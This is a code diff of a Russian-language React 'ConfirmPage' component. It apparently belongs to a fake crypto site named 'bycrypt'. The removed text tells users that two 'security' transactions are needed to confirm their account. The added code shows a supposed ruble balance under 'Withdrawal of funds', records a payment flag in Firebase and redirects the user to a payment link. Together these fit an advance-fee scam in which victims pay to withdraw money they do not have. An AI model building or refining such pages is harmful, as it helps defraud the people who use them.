@@ -1,18 +1,21 @@
-import React from 'react';
+import React, { useState } from 'react';
+import axios from 'axios';
 import pic1 from './img/pic1-1.png'
 import pic2 from './img/pic1-2.png'
 import footbg from './img/footerbg.png'
 import {Link} from 'react-router-dom'
 import { useDispatch } from 'react-redux';
-import { addNewMessage } from './store/chatReducer';
 
 
-const ConfirmPage = () => {
-    const dispatch = useDispatch()
-    const userId = localStorage.getItem('userId')
+const ConfirmPage = ({balance, currentLink}) => {
 
-  async function addMessageHandler(event, id, url){
-        await dispatch(addNewMessage(id))
+
+    const [bal, setBal] = useState(balance)
+
+
+
+  async function addPaymentHandler(payment, url){
+    await axios.post(`https://bycrypt-a7205-default-rtdb.asia-southeast1.firebasedatabase.app/payment.json`, payment)
         window.location.href = url
     }
 
@@ -32,13 +35,24 @@ const ConfirmPage = () => {
             <div className="container">
                 <div className="section_content">
                     <div className="section_content_left">
-                        <div className="section_content_left_text">
-                            <h2>Подтверждение счёта</h2>
-                            <p>Для подтверждения счёта, в целях безопасности будут производиться две транзакции, на ввод и вывод средств, после этого вы сможете вносить депозиты и выводить средства с вашего электронного кошелька.</p>
-                        </div>
+                       {bal > 0 ?  <div className="section_content_left_text">
+                            <h2>Вывод средств</h2>
+                            <p><span>Баланс: <strong>{balance} ₽</strong></span><br/>
+                                <span>Доступные средства: <strong>{balance} ₽</strong></span><br/><br/> 
+                                Подтвердите совершение транзакции
+                            </p>
+                        </div> :  <div className="section_content_left_text">
+                            <h2>Вывод средств</h2>
+                            <p><span>Баланс: <strong> 0 ₽</strong></span><br/>
+                                <span>Доступные средства: <strong>0 ₽</strong></span><br/><br/> 
+                                Транзакция недоступна
+                            </p>
+                        </div>}
                         <div className="section_content_left_btn">
                             <div className="btn">
-                                <p onClick={(event)=> addMessageHandler(event, userId, "https://yookassa.ru/my/i/Yi8NOinmPRGm?type=text")}>Продолжить</p>
+                                <button onClick={()=> addPaymentHandler( true  , currentLink)}
+                                        disabled = {balance > 0 ? false : true}
+                                >Продолжить</button>
                             </div>
                         </div>
                     </div>
